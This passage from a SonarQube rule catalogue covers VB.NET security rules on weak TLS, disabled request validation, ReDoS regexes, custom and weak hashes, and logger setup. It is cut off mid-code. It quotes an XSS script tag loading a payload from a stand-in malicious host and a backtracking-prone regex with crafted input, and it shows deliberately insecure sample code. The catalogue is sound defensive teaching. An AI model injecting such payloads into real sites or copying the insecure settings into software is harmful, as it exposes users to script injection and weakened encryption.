  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4423">
              vbnet:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>These samples use a default TLS algorithm, which is a weak cryptographical algorithm: TLSv1.0.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Net
Imports System.Security.Authentication

Public Sub Encrypt()
    ServicePointManager.SecurityProtocol &#61; SecurityProtocolType.Tls &#39; Noncompliant
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports System.Net.Http
Imports System.Security.Authentication

Public Sub Encrypt()
    Dim Handler As New HttpClientHandler With {
        .SslProtocols &#61; SslProtocols.Tls &#39; Noncompliant
    }
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Net
Imports System.Security.Authentication

Public Sub Encrypt()
    ServicePointManager.SecurityProtocol &#61; _
        SecurityProtocolType.Tls12 _
        Or SecurityProtocolType.Tls13
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
Imports System.Net.Http
Imports System.Security.Authentication

Public Sub Encrypt()
    Dim Handler As New HttpClientHandler With {
        .SslProtocols &#61; SslProtocols.Tls12
    }
End Sub
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5753">
              vbnet:S5753
            </a>
          </td>
          <td>
            <details>
              <p>ASP.NET 1.1&#43; comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This
feature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting
requests potentially containing malicious content.</p>
<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script
type&#61;&#34;text/javascript&#34; src&#61;&#34;https://malicious.domain/payload.js&#34;&gt;</code> to reach your Controller.</p>
<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the developer doesn’t know the impact to deactivate the Request Validation feature </li><li> the web application accepts user-supplied data </li><li> all user-supplied data are not validated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Activate the Request Validation feature for all HTTP requests </li></ul>
<h2>Sensitive Code Example</h2>
<p>At Controller level:</p>
<pre>
&lt;ValidateInput(False)&gt;
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest&#61;&#34;false&#34; /&gt;
      ...
      &lt;httpRuntime requestValidationMode&#61;&#34;0.0&#34; /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>At Controller level:</p>
<pre>
&lt;ValidateInput(True)&gt;
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>or</p>
<pre>
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest&#61;&#34;true&#34; /&gt;
      ...
      &lt;httpRuntime requestValidationMode&#61;&#34;4.5&#34; /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view&#61;netframework-4.8" rel="nofollow">HttpRuntimeSection.RequestValidationMode Property</a> </li><li> <a href="https://owasp.org/www-community/ASP-NET_Request_Validation" rel="nofollow">OWASP ASP.NET Request Validation</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4784">
              vbnet:S4784
            </a>
          </td>
          <td>
            <details>
              <p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a&#43;)&#43;s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>If the regular expression is vulnerable to ReDos attacks, mitigate the risk by using a &#34;match timeout&#34; to limit the time spent running the regular
expression.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Runtime.Serialization
Imports System.Text.RegularExpressions
Imports System.Web

Namespace N
    Public Class RegularExpression
        Private Sub Foo(ByVal pattern As String, ByVal options As RegexOptions, ByVal matchTimeout As TimeSpan,
                        ByVal input As String, ByVal replacement As String, ByVal evaluator As MatchEvaluator)
            &#39; All the following instantiations are Sensitive. Validate the regular expression and matched input.
            Dim r As Regex &#61; New System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;b&#34;)
            r &#61; New System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;b&#34;, options)
            r &#61; New System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;b&#34;, options, matchTimeout)

            &#39; All the following static methods are Sensitive.
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;b&#34;)
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;b&#34;, options)
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;b&#34;, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;b&#34;)
            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;b&#34;, options)
            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;b&#34;, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;b&#34;)
            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;b&#34;, options)
            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;b&#34;, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, evaluator)
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, evaluator, options)
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, evaluator, options, matchTimeout)
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, replacement)
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, replacement, options)
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;b&#34;, replacement, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;b&#34;)
            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;b&#34;, options)
            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;b&#34;, options, matchTimeout)
        End Sub
    End Class
End Namespace
</pre>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2257">
              vbnet:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>
<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>
<ul><li> <code>AsymmetricAlgorithm</code> </li><li> <code>AsymmetricKeyExchangeDeformatter</code> </li><li> <code>AsymmetricKeyExchangeFormatter</code> </li><li> <code>AsymmetricSignatureDeformatter</code> </li><li> <code>AsymmetricSignatureFormatter</code> </li><li> <code>DeriveBytes</code> </li><li> <code>HashAlgorithm</code> </li><li> <code>ICryptoTransform</code> </li><li> <code>SymmetricAlgorithm</code> </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a standard algorithm instead of creating a custom one. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Class CustomHash     &#39; Noncompliant
    Inherits HashAlgorithm

    Private fResult() As Byte

    Public Overrides Sub Initialize()
        fResult &#61; Nothing
    End Sub

    Protected Overrides Function HashFinal() As Byte()
        Return fResult
    End Function

    Protected Overrides Sub HashCore(array() As Byte, ibStart As Integer, cbSize As Integer)
        fResult &#61; If(fResult, array.Take(8).ToArray)
    End Sub

End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim mySHA256 As SHA256 &#61; SHA256.Create()
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST" rel="nofollow">MessageDigest is Custom</a>
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4790">
              vbnet:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()

    &#39; Review all instantiations of classes that inherit from HashAlgorithm, for example:
    Dim hashAlgo As HashAlgorithm &#61; HashAlgorithm.Create() &#39; Sensitive
    Dim hashAlgo2 As HashAlgorithm &#61; HashAlgorithm.Create(&#34;SHA1&#34;) &#39; Sensitive
    Dim sha As SHA1 &#61; New SHA1CryptoServiceProvider() &#39; Sensitive
    Dim md5 As MD5 &#61; New MD5CryptoServiceProvider() &#39; Sensitive

    &#39; ...
End Sub

Class MyHashAlgorithm
    Inherits HashAlgorithm &#39; Sensitive

    &#39; ...
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()
    Dim sha256 &#61; New SHA256CryptoServiceProvider() &#39; Compliant
    Dim sha384 &#61; New SHA384CryptoServiceProvider() &#39; Compliant
    Dim sha512 &#61; New SHA512CryptoServiceProvider() &#39; Compliant

    &#39; ...
End Sub
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4792">
              vbnet:S4792
            </a>
          </td>
          <td>
            <details>
              <p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0285" rel="nofollow">CVE-2018-0285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2000-1127" rel="nofollow">CVE-2000-1127</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-15113" rel="nofollow">CVE-2017-15113</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-5742" rel="nofollow">CVE-2015-5742</a> </li></ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul><li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li><li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li></ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li><li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li><li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li><li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li><li> the logs are only stored locally instead of being backuped or replicated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Check that your production deployment doesn’t have its loggers in &#34;debug&#34; mode as it might write sensitive information in logs. </li><li> Production logs should be stored in a secure location which is only accessible to system administrators. </li><li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li><li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li><li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li><li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li></ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul><li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li><li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li><li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li><li> Monitor the logs for any suspicious activity. </li></ul>
<h2>Sensitive Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports Microsoft.AspNetCore
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting
Imports Microsoft.Extensions.Configuration
Imports Microsoft.Extensions.DependencyInjection
Imports Microsoft.Extensions.Logging
Imports Microsoft.Extensions.Options

Namespace MvcApp

    Public Class ProgramLogging

        Public Shared Function CreateWebHostBuilder(args As String()) As IWebHostBuilder

            WebHost.CreateDefaultBuilder(args) _
                .ConfigureLogging(Function(hostingContext, Logging) &#39; Sensitive
                                      &#39; ...
                                  End Function) _
            .UseStartup(Of StartupLogging)()

            &#39;...
        End Function
    End Class


    Public Class StartupLogging

        Public Sub ConfigureServices(services As IServiceCollection)

            services.AddLogging(Function(logging) &#39; Sensitive
                                    &#39;...
                                End Function)
        End Sub

        Public Sub Configure(app As IApplicationBuilder, env As IHostingEnvironment, loggerFactory As ILoggerFactory)

            Dim config As IConfiguration &#61; Nothing
            Dim level As LogLevel &#61; LogLevel.Critical
            Dim includeScopes As Boolean &#61; False
            Dim filter As Func(Of String, Microsoft.Extensions.Logging.LogLevel, Boolean) &#61; Nothing
            Dim consoleSettings As Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings &#61; Nothing
            Dim azureSettings As Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings &#61; Nothing
            Dim eventLogSettings As Microsoft.Extensions.Logging.EventLog.EventLogSettings &#61; Nothing

            &#39; An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics() &#39; Sensitive
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings) &#39; Sensitive
            loggerFactory.AddConsole() &#39; Sensitive
            loggerFactory.AddConsole(level) &#39; Sensitive
            loggerFactory.AddConsole(level, includeScopes) &#39; Sensitive
            loggerFactory.AddConsole(filter) &#39; Sensitive
            loggerFactory.AddConsole(filter, includeScopes) &#39; Sensitive
            loggerFactory.AddConsole(config) &#39; Sensitive
            loggerFactory.AddConsole(consoleSettings) &#39; Sensitive
            loggerFactory.AddDebug() &#39; Sensitive
            loggerFactory.AddDebug(level) &#39; Sensitive
            loggerFactory.AddDebug(filter) &#39; Sensitive
            loggerFactory.AddEventLog() &#39; Sensitive
            loggerFactory.AddEventLog(eventLogSettings) &#39; Sensitive
            loggerFactory.AddEventLog(level) &#39; Sensitive
            &#39; Only available for NET Standard 2.0 and above
            &#39;loggerFactory.AddEventSourceLogger() &#39; Sensitive

            Dim providers As IEnumerable(Of ILoggerProvider) &#61; Nothing
            Dim filterOptions1 As LoggerFilterOptions &#61; Nothing
            Dim filterOptions2 As IOptionsMonitor(Of LoggerFilterOptions) &#61; Nothing

            Dim factory As LoggerFactory &#61; New LoggerFactory() &#39; Sensitive
            factory &#61; New LoggerFactory(providers) &#39; Sensitive
            factory &#61; New LoggerFactory(providers, filterOptions1) &#39; Sensitive
            factory &#61; New LoggerFactory(providers, filterOptions2) &#39; Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Log4Net</strong></p>
<pre>
Imports System
Imports System.IO
Imports System.Xml
Imports log4net.Appender
Imports log4net.Config
Imports log4net.Repository

Namespace Logging
    Class Log4netLogging
        Private Sub Foo(ByVal repository As ILoggerRepository, ByVal element As XmlElement, ByVal configFile As FileInfo, ByVal configUri As Uri, ByVal configStream As Stream, ByVal appender As IAppender, ParamArray appenders As IAppender())
            log4net.Config.XmlConfigurator.Configure(repository) &#39; Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, element) &#39; Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configFile) &#39; Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configUri) &#39; Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configStream) &#39; Sensitive
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile) &#39; Sensitive

            log4net.Config.DOMConfigurator.Configure() &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(repository) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(element) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, element) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(configFile) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configFile) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(configStream) &#39; Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configStream) &#39; Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile) &#39; Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile) &#39; Sensitive

